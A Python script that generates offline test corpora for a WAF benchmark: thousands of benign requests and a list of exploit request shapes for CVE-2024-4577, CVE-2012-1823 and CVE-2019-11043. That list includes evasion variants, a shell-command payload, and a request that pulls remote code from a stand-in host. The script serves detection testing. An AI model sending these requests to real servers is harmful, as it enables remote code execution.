#!/usr/bin/env python3
"""Build the two request corpora for the WAF benchmark (stdlib only, offline).

  corpus.py <wordpress checkout> <outdir>

benign.log   ordinary requests, combined log format, one category per client
             address so a hit can be traced back to how the line was made.
attacks.tsv  exploit request shapes: cve, variant, technique, request target.

Everything is generated: no live site is contacted and no real traffic is
used. The benign set is deterministic (fixed seed).
"""
import base64
import random
import sys
from pathlib import Path
from urllib.parse import quote

R = random.Random(20261114)

WORDS = ("order invoice summer sale blue running shoes laptop stand privacy policy contact about pricing "
         "docs install guide release notes php composer wordpress plugin theme update security report "
         "newsletter account settings billing team project dashboard export import calendar holiday").split()
# Non-ASCII search terms and slugs. Several contain a byte 0xAD in UTF-8
# (í = C3 AD, 흭 etc.), which is exactly what a naive "%ad" rule trips on.
UNICODE = ["información", "categoría", "política de privacidad", "tecnología", "país", "aquí", "así",
           "medicína", "příběh", "žížala", "Zürich", "größe", "straße", "crème brûlée", "naïve", "façade",
           "日本語 検索", "中文 搜索", "한국어 검색", "русский поиск", "ελληνικά", "العربية", "עברית",
           "São Paulo", "Curaçao", "smörgåsbord", "pâté", "jalapeño", "Łódź", "Kraków", "İstanbul",
           "👍 emoji", "café ☕", "Việt Nam", "Đà Nẵng", "português", "notícias", "fotografía", "economía",
           "energía", "biología", "geografía", "María", "García", "Martín", "día", "río", "tío", "frío"]
# Things people really type into a docs or forum search box, or that appear in
# slugs: they mention the php.ini directives without being an attack.
DOCS = ["auto_prepend_file", "allow_url_include", "what is allow_url_include", "auto_prepend_file not working",
        "php.ini auto_prepend_file", "allow_url_include deprecated", "disable allow_url_include",
        "how to set auto_prepend_file in htaccess", "allow_url_fopen vs allow_url_include"]
DOC_PATHS = ["/manual/en/ini.core.php#ini.auto-prepend-file", "/blog/why-allow_url_include-is-dangerous/",
             "/docs/php/allow_url_include", "/questions/1234/what-does-auto_prepend_file-do",
             "/kb/hardening/disable-allow_url_include.html", "/tags/auto_prepend_file/page/2/"]
LARAVEL = ["/", "/login", "/register", "/logout", "/password/reset", "/dashboard", "/users", "/users/42",
           "/users/42/edit", "/api/user", "/api/v1/posts", "/api/v1/posts/17/comments", "/sanctum/csrf-cookie",
           "/livewire/update", "/livewire/livewire.js", "/storage/avatars/42.png", "/_debugbar/assets/javascript",
           "/horizon/api/stats", "/telescope/requests", "/up", "/email/verify/7/3f2a", "/build/assets/app-4ed9.js"]
SYMFONY = ["/", "/en/blog/", "/en/blog/posts/lorem-ipsum", "/en/admin/post/", "/en/login", "/_wdt/8f3c21",
           "/_profiler/8f3c21?panel=request", "/api/docs.json", "/bundles/framework/css/body.css",
           "/_fragment?_path=_controller%3DApp%255CController%255CBlog", "/en/blog/search?q=symfony"]
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15"

# category -> address in a documentation range, so hits can be attributed
CATS = ["wp-file", "wp-asset", "wp-rest", "framework-route", "search-ascii", "search-unicode", "slug-unicode",
        "utm", "pagination", "token", "multiline-form", "docs-search", "docs-path", "encoded-misc"]
ADDR = {c: f"192.0.2.{i + 1}" for i, c in enumerate(CATS)}


def q(s):
    return quote(s, safe="")


def benign(wp: Path):
    out = []

    def add(cat, target):
        out.append((cat, target))

    # WordPress: every admin and login script, with and without common queries
    for p in sorted((wp / "wp-admin").glob("*.php")) + sorted(wp.glob("wp-*.php")):
        rel = "/" + str(p.relative_to(wp))
        add("wp-file", rel)
        add("wp-file", f"{rel}?page={R.choice(WORDS)}&paged={R.randint(1, 40)}")
    # assets with cache-busting versions
    assets = sorted(list((wp / "wp-includes" / "js").rglob("*.js")) + list((wp / "wp-includes" / "css").rglob("*.css"))
                    + list((wp / "wp-admin" / "js").rglob("*.js")) + list((wp / "wp-admin" / "css").rglob("*.css")))
    for p in assets:
        add("wp-asset", f"/{p.relative_to(wp)}?ver={R.choice(['7.1.4', '6.9.2', '3.7.1', '1.13.3'])}")
    # REST API
    for ep in ("posts", "pages", "media", "users", "comments", "categories", "tags", "search", "types",
               "statuses", "taxonomies", "settings", "themes", "plugins", "block-types", "blocks",
               "templates", "template-parts", "navigation", "menus", "menu-items", "sidebars", "widgets"):
        add("wp-rest", f"/wp-json/wp/v2/{ep}")
        add("wp-rest", f"/wp-json/wp/v2/{ep}?per_page={R.choice([10, 20, 100])}&page={R.randint(1, 9)}&_fields=id,title,link")
        add("wp-rest", f"/wp-json/wp/v2/{ep}/{R.randint(1, 9999)}?context=edit&_locale=user")
        add("wp-rest", f"/?rest_route=/wp/v2/{ep}&search={q(R.choice(WORDS))}")
    for r in LARAVEL + SYMFONY:
        add("framework-route", r)
    for _ in range(1500):
        add("search-ascii", f"/?s={q(' '.join(R.sample(WORDS, R.randint(1, 4))))}")
        add("search-ascii", f"/search?q={'+'.join(R.sample(WORDS, R.randint(1, 3)))}&sort={R.choice(['new', 'top'])}")
    for term in UNICODE:
        for path in ("/?s=", "/search?q=", "/buscar?texto=", "/api/v1/search?term="):
            add("search-unicode", path + q(term))
            add("search-unicode", path + q(term).lower())          # some clients lower-case the hex
        add("slug-unicode", "/" + q(term.replace(" ", "-")) + "/")
        add("slug-unicode", "/blog/" + q(term.replace(" ", "-")) + "/?utm_source=newsletter")
        add("slug-unicode", "/tag/" + q(term.replace(" ", "-")).lower() + "/feed/")
    for _ in range(1200):
        add("utm", f"/{R.choice(WORDS)}/?utm_source={R.choice(['google', 'newsletter', 'x'])}&utm_medium=cpc"
                   f"&utm_campaign={R.choice(WORDS)}_{R.randint(2024, 2026)}&gclid={base64.urlsafe_b64encode(R.randbytes(30)).decode()}")
        add("pagination", f"/{R.choice(WORDS)}/page/{R.randint(2, 300)}/?orderby=date&order=desc&per_page=50")
        tok = base64.urlsafe_b64encode(R.randbytes(R.randint(16, 64))).decode().rstrip("=")
        add("token", f"/verify?token={tok}&expires={R.randint(1700000000, 1800000000)}&signature={R.randbytes(32).hex()}")
        add("token", f"/download/{R.randbytes(16).hex()}?jwt=eyJhbGciOiJIUzI1NiJ9.{tok}.{R.randbytes(24).hex()}")
    # GET forms carrying a textarea: encoded newlines in the QUERY are ordinary
    for _ in range(400):
        lines = [" ".join(R.sample(WORDS, R.randint(2, 5))) for _ in range(R.randint(2, 4))]
        nl = R.choice(["%0A", "%0D%0A", "%0a", "%0d%0a"])
        add("multiline-form", "/contact?name=Ana&message=" + nl.join(q(x) for x in lines))
        add("multiline-form", "/wp-admin/admin-ajax.php?action=preview&content=" + nl.join(q(x) for x in lines))
    for d in DOCS:
        for path in ("/?s=", "/search?q=", "/docs/search?query=", "/forum/search.php?keywords="):
            add("docs-search", path + q(d))
            add("docs-search", path + d.replace(" ", "+"))
    for p in DOC_PATHS:
        add("docs-path", p)
        add("docs-path", p + "?ref=search")
    for _ in range(600):
        add("encoded-misc", f"/files/{q(R.choice(WORDS))}%20{R.randint(1, 99)}%20%28final%29.pdf")
        add("encoded-misc", f"/r?url={q('https://example.org/' + R.choice(WORDS) + '?a=1&b=2')}")
        add("encoded-misc", f"/img/{R.randbytes(8).hex()}.jpg?w={R.choice([320, 640, 1280])}&fit=crop&q=80&fm=webp")
    return out


# (cve, variant, technique, target)
ATTACKS = [
    # CVE-2024-4577: PHP-CGI on Windows, soft hyphen (0xAD) read as "-"
    ("CVE-2024-4577", "published PoC", "canonical",
     "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
    ("CVE-2024-4577", "PoC against index.php", "canonical",
     "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
    ("CVE-2024-4577", "XAMPP PoC with cgi.force_redirect", "canonical",
     "/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
    ("CVE-2024-4577", "lower-case hex", "case", "/index.php?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input"),
    ("CVE-2024-4577", "mixed-case directive names", "case",
     "/index.php?%ADd+Allow_Url_Include%3d1+%ADd+AUTO_PREPEND_FILE%3dphp://input"),
    ("CVE-2024-4577", "raw = instead of %3d", "encoding", "/index.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input"),
    ("CVE-2024-4577", "upper-case %3D", "encoding", "/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"),
    ("CVE-2024-4577", "source disclosure only (-s)", "no directive", "/index.php?%ADs"),
    ("CVE-2024-4577", "different directives (extension, open_basedir)", "no listed directive",
     "/index.php?%ADd+open_basedir%3d/+%ADd+disable_functions%3d+%ADd+auto_append_file%3dphp://input"),
    ("CVE-2024-4577", "encoded underscores in directive names", "encoding",
     "/index.php?%ADd+allow%5furl%5finclude%3d1+%ADd+auto%5fprepend%5ffile%3dphp://input"),
    ("CVE-2024-4577", "double-encoded soft hyphen", "double encoding",
     "/index.php?%25ADd+allow%255furl%255finclude%253d1+%25ADd+auto%255fprepend%255ffile%253dphp://input"),
    ("CVE-2024-4577", "raw 0xAD byte as nginx logs it", "raw byte",
     "/index.php?\\xADd+allow_url_include%3d1+\\xADd+auto_prepend_file%3dphp://input"),
    # CVE-2012-1823: php-cgi takes a query string without "=" as options
    ("CVE-2012-1823", "published PoC", "canonical",
     "/index.php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+disable_functions%3d%22%22+-d+open_basedir%3dnone+-d+auto_prepend_file%3dphp://input+-n"),
    ("CVE-2012-1823", "short PoC", "canonical", "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"),
    ("CVE-2012-1823", "%20 separators", "encoding", "/index.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input"),
    ("CVE-2012-1823", "no space after -d", "encoding", "/index.php?-dallow_url_include%3d1+-dauto_prepend_file%3dphp://input"),
    ("CVE-2012-1823", "mixed-case directive names", "case", "/index.php?-d+ALLOW_URL_INCLUDE%3d1+-d+Auto_Prepend_File%3dphp://input"),
    ("CVE-2012-1823", "source disclosure (-s)", "no directive", "/index.php?-s"),
    ("CVE-2012-1823", "encoded underscores", "encoding", "/index.php?-d+allow%5Furl%5Finclude%3d1+-d+auto%5Fprepend%5Ffile%3dphp://input"),
    ("CVE-2012-1823", "auto_append_file instead", "no listed directive", "/index.php?-d+allow_url_fopen%3d1+-d+auto_append_file%3dhttp://198.51.100.7/x.txt"),
    ("CVE-2012-1823", "double-encoded", "double encoding", "/index.php?-d+allow%255Furl%255Finclude%253d1+-d+auto%255Fprepend%255Ffile%253dphp://input"),
    # CVE-2019-11043: newline in PATH_INFO underflows fastcgi_split_path_info
    ("CVE-2019-11043", "phuip-fpizdam detection request", "canonical",
     "/index.php/PHP%0Ais_the_shittiest_lang.php?" + "Q" * 1700),
    ("CVE-2019-11043", "payload stage", "canonical",
     "/index.php/PHP_VALUE%0Asession.auto_start=1;;;?a=/bin/sh+-c+'which+which'&" + "Q" * 1500),
    ("CVE-2019-11043", "lower-case path", "case", "/index.php/php_value%0aerror_log=/tmp/a;;;?" + "Q" * 1500),
    ("CVE-2019-11043", "other script name", "canonical", "/app.php/PHP%0Ainfo.php?" + "Q" * 1700),
    ("CVE-2019-11043", "double-encoded newline", "double encoding", "/index.php/PHP%250Ainfo.php?" + "Q" * 1700),
    ("CVE-2019-11043", "raw newline as logged (\\x0A)", "raw byte", "/index.php/PHP\\x0Ainfo.php?" + "Q" * 1700),
    ("CVE-2019-11043", "carriage return + newline", "encoding", "/index.php/PHP%0D%0Ainfo.php?" + "Q" * 1700),
]


def logline(ip, target, status=200):
    return (f'{ip} - - [14/Nov/2026:10:00:00 +0000] "GET {target} HTTP/1.1" {status} 512 "-" "{UA}"')


def main(argv):
    wp, out = Path(argv[1]), Path(argv[2])
    out.mkdir(parents=True, exist_ok=True)
    b = benign(wp)
    (out / "benign.log").write_text("\n".join(logline(ADDR[c], t) for c, t in b) + "\n")
    (out / "attacks.tsv").write_text("\n".join("\t".join(a) for a in ATTACKS) + "\n")
    (out / "attacks.log").write_text("\n".join(logline("198.51.100.9", a[3], 404) for a in ATTACKS) + "\n")
    print(f"benign: {len(b)} requests in {len(CATS)} categories; attacks: {len(ATTACKS)} request shapes")


if __name__ == "__main__":
    main(sys.argv)
